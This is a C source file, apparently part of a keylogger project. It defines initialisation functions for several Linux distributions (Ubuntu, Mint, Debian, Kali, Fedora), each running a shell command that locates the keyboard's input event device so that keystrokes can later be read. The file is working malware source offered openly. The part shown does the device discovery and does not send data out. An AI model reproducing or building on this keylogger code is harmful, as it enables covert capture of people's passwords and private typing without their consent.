#include <stdlib.h>
#include <stdio.h>  // printf()
#include <unistd.h>  // geteuid()
#include <syslog.h>  // syslog()
#include <errno.h>
#include <string.h>  //strerror()
#include <sys/stat.h>  // umask()

#include "../../includes/keylogger/keylogger_utils.h"
#include "../../includes/keylogger/debian_keylogger_utils.h"
#include "../../includes/keylogger/keylogger.h"


void ubuntu16_keylogger_init(void)
{
    /** For Debian **/
    //const char *command = "grep -E 'Handlers|EV' /proc/bus/input/devices | grep -B1 120013 |  grep -Eo event[0-9]";
    //const char *command =  "grep -E 'Handlers|EV' /proc/bus/input/devices | grep -B1 120013 | grep -Eo event[0-9]+ | tr '\\n' '\\0'";

    /** Ubunutu 16.04 **/
    //const char *command = "find /dev/input/by-id -name '*Device*'";
    //const char *command = "grep -E 'Handlers|EV' /proc/bus/input/devices | grep -B1 120013 | grep -Eo event[0-9]+ | tr '\\n' '\\0'";
    
    const char *command = "find /dev/input/by-path -name '*serio-0-event-kbd*'";
    
     get_kb_device_filename(command);

    /** Kali and Mint 19 **/
    //const char *command = "find /dev/input/by-path -name '*serio-0-event-kbd*'";

    /** For Debian **/
    //debian_get_kb_device_filename(command);

    /** For others distrib **/
    //get_kb_device_filename(command);

    return;
}

void ubuntu18_keylogger_init(void)
{
    /** For Debian **/
    //const char *command = "grep -E 'Handlers|EV' /proc/bus/input/devices | grep -B1 120013 |  grep -Eo event[0-9]";
    //const char *command =  "grep -E 'Handlers|EV' /proc/bus/input/devices | grep -B1 120013 | grep -Eo event[0-9]+ | tr '\\n' '\\0'";

    /** Ubunutu 18**/
    //const char *command = "find /dev/input/by-id -name '*Device*'";
    const char *command = "grep -E 'Handlers|EV' /proc/bus/input/devices | grep -B1 120013 | grep -Eo event[0-9]+ | tr '\\n' '\\0'";

    /** Kali and Mint 19 **/
    //const char *command = "find /dev/input/by-path -name '*serio-0-event-kbd*'";

    /** For Debian and Ubuntu 18 **/
    debian_get_kb_device_filename(command);

    /** For others distrib **/
    //get_kb_device_filename(command);

    return;
}


void mint_keylogger_init(void)
{
    /** Kali and Mint 19 **/
    const char *command = "find /dev/input/by-path -name '*serio-0-event-kbd*'"; 
    
    get_kb_device_filename(command);

    return;
}

void debian_keylogger_init(void)
{
    /* For Debian */
    //const char *command = "grep -E 'Handlers|EV' /proc/bus/input/devices | grep -B1 120013 |  grep -Eo event[0-9]";
    const char *command = "grep -E 'Handlers|EV' /proc/bus/input/devices | grep -B1 120013 | grep -Eo event[0-9]+ | tr '\\n' '\\0'";

    /* For Debian */
    debian_get_kb_device_filename(command);

    return;
}

void kali_keylogger_init(void)
{
    /* Kali and Mint 19 */
    const char *command = "find /dev/input/by-path -name '*serio-0-event-kbd*'";

    /* For others distrib */
    get_kb_device_filename(command);

    return;
}

void fedora_keylogger_init(void)
{

    /* Fedora 28 */
    const char *command =  "grep -E 'Handlers|EV' /proc/bus/input/devices | grep -B1 120013 | grep -Eo event[0-9]+ | tr '\\n' '\\0'";

    /* For others distrib */
    debian_get_kb_device_filename(command);

    return;
}
